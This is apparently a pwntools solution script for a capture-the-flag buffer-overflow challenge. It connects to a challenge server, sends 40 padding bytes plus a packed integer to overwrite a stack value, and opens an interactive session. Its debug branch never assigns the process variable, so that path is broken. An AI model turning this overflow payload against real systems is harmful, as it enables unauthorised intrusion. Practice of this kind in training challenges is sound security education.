from pwn import *
elf = ELF('./lilof')
if args.REMOTE:
    p = remote('lil-overflow.challs.olicyber.it', 34002)
elif args.GDB:
    gdb.debug([elf.path],'''
              b main
              c
              '''
              )
else:
    p = process([elf.path])

p.recvline()
payload = b'a'*40+ p32(95099824)
p.sendline(payload)
p.interactive()